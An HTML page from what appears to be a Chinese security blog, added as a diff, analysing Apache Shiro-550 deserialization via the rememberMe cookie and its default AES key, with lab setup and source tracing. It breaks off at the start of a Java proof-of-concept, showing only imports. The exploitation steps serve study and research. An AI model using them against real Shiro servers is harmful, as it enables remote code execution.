@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>shiro 反序列化漏洞 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="shiro 反序列化漏洞">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-12T20:58:47+00:00">
+    <meta property="article:modified_time" content="2024-10-12T20:58:47+00:00">
+    <meta property="article:tag" content="Java">
+    <meta property="article:tag" content="Shiro">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="shiro 反序列化漏洞">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="prev" href="http://localhost:1313/posts/rome/" /><link rel="next" href="http://localhost:1313/posts/c3p0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "shiro 反序列化漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java, shiro","wordcount":  2678 ,
+        "url": "http:\/\/localhost:1313\/posts\/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2024-10-12T20:58:47+00:00","dateModified": "2024-10-12T20:58:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">shiro 反序列化漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-10-12">2024-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2678 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#shiro-550">Shiro-550</a>
+      <ul>
+        <li><a href="#漏洞原理">漏洞原理</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#rememberme-生成">rememberMe 生成</a></li>
+            <li><a href="#rememberme-解密">rememberMe 解密</a></li>
+            <li><a href="#漏洞利用">漏洞利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#shiro-721">Shiro-721</a>
+      <ul>
+        <li><a href="#漏洞利用条件">漏洞利用条件</a></li>
+        <li><a href="#漏洞原理-1">漏洞原理</a></li>
+        <li><a href="#环境搭建-1">环境搭建</a></li>
+        <li><a href="#漏洞分析-1">漏洞分析</a>
+          <ul>
+            <li><a href="#漏洞利用-1">漏洞利用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="shiro-反序列化漏洞">shiro 反序列化漏洞</h1>
+<h2 id="shiro-550">Shiro-550</h2>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p><strong>影响版本</strong>：Apache Shiro &lt; 1.2.4
+<strong>特征判断</strong>：返回包中包含<code>rememberMe=deleteMe</code>字段。</p>
+<p>为了让浏览器或服务器重启后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存在 Cookie 的 rememberMe 字段中，下次读取时进行解密再反序列化。Payload产生的过程：  命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值。这里面比较重要的就是搞到 AES 加密的密钥。</p>
+<p>而在 Shiro 1.2.4 版本之前内置了一个默认且固定的加密 Key，如果没有更改默认密码，攻击者就可以伪造任意的 rememberMe Cookie，进而触发反序列化漏洞。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>分别下载
+shiro 下载地址：<a href="https://github.com/jas502n/SHIRO-550" target="_blank" rel="noopener noreffer ">https://github.com/jas502n/SHIRO-550</a>（下载对应war包即可）</p>
+<p>shiro 源码下载地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener noreffer ">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>打开源码文件目录，然后配置 tomcat 服务，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224230.png" /></p>
+<p>然后选择下载的 shiro war 包</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-224616.png" /></p>
+<p>在项目中也需要更改为 jdk1.7 版本。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-225046.png" /></p>
+<p>最后运行访问端口。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241012-230246.png" /></p>
+<p>具体参考：<a href="https://blog.csdn.net/qq_44769520/article/details/123476443" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/qq_44769520/article/details/123476443</a></p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<h4 id="rememberme-生成">rememberMe 生成</h4>
+<p>登录抓包，看见在成功登录后给了一个 set-cookie，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-104303.png" /></p>
+<p>回到源码看看这串 cookie 是怎么生成的，全局搜索 cookie 相关处理的类，发现了 CookieRememberMeMananger 类，分析该类的方法，发现方法 <code>rememberSerializedIdentity</code> 就是生成 cookie 的函数，不过这里只能看到把 serialized 进行了 base64 编码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-105800.png" /></p>
+<p>发现其在函数 <code>AbstractRememberMeManager#rememberIdentity</code> 调用，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-111827.png" /></p>
+<p>跟进看到调用了函数 <code>convertPrincipalsToBytes</code> 对 cookie 数据进行加密，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-112324.png" /></p>
+<p>来到 <code>convertPrincipalsToBytes</code> 函数，首先进行了序列化，然后进行加密，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113012.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113054.png" /></p>
+<p>加密的话就是个 AES 加密，看一下其 key 是通过 <code>getEncryptionCipherKey</code> 函数来的，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-113455.png" /></p>
+<p>而这个函数其实就是返回了个常量，所以现在要找谁给常量 <code>encryptionCipherKey</code> 赋了值。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122630.png" /></p>
+<p>找到函数 <code>setCipherKey</code>，其调用的 <code>setEncryptionCipherKey</code> 和 <code>setDecryptionCipherKey</code> 就是分别给加密和解密设置 key</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-122958.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132639.png" />
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-123136.png" /></p>
+<p>继续朔源看谁调用了 <code>setCipherKey</code> 函数，发现在构造函数中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132846.png" /></p>
+<p>常量 <code>DEFAULT_CIPHER_KEY_BYTES</code> 就是默认设置的加密 key 了。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-132915.png" /></p>
+<p>至此生成 cookie 的大概过程就清楚了就是序列化+AES 加密+base64 编码。</p>
+<h4 id="rememberme-解密">rememberMe 解密</h4>
+<p>现在来看看是如何获取 cookie 并进行反序列化的，找到其 base64 解码对应方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-114810.png" /></p>
+<p>同样查找谁调用了该方法，在 <code>AbstractRememberMeManager#getRememberedPrincipals</code>，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-115309.png" /></p>
+<p>这里就是先调用 <code>getRememberedSerializedIdentity</code> 函数进行 base64 解码后在调用 <code>convertBytesToPrincipals</code> 进行 AES 解密和反序列化，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-134107.png" /></p>
+<h4 id="漏洞利用">漏洞利用</h4>
+<p>知道存在反序列化，那么 payload 生成也就是序列化恶意 poc+AES 加密+base64 加密，然后就可以进行攻击了。由于 shiro 是自带 cb 依赖的，所以可以直接打 cb 链。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ20241013-220926.png" /></p>
+<p>构造 poc，</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.apache.shiro.web</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.codec.Base64</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.codec.CodecSupport</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.shiro.util.ByteSource</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">  
